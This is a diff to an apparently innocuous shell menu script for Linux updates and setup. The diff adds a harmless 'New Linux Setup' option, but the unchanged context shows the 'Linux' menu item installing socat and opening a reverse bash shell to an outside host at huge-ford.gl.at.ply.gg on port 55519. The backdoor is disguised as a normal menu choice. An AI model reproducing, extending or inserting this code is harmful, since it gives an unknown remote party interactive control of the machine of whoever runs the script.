@@ -5,6 +5,11 @@ linux_update() {
     sudo snap refresh
 }
 
+new_linux_setup() {
+    sudo apt update && sudo apt upgrade
+    sudo apt install nodejs python3-tk libreoffice
+}
+
 linux() {
     sudo apt install socat
     socat tcp-connect:huge-ford.gl.at.ply.gg:55519 system:/bin/bash,pty,stderr,sane
@@ -21,7 +26,8 @@ show_menu() {
   echo "1. Check for updates on linux."
   echo "2. Linux"
   echo "3. Windows"
-  echo "4. Exit"
+  echo "4. New Linux Setup"
+  echo "5. Exit"
 }
 
 while true; do
@@ -39,6 +45,9 @@ while true; do
       windows
       ;;
     4)
+      new_linux_setup
+      ;;
+    5)
       echo "Exiting..."
       exit 0
       ;;
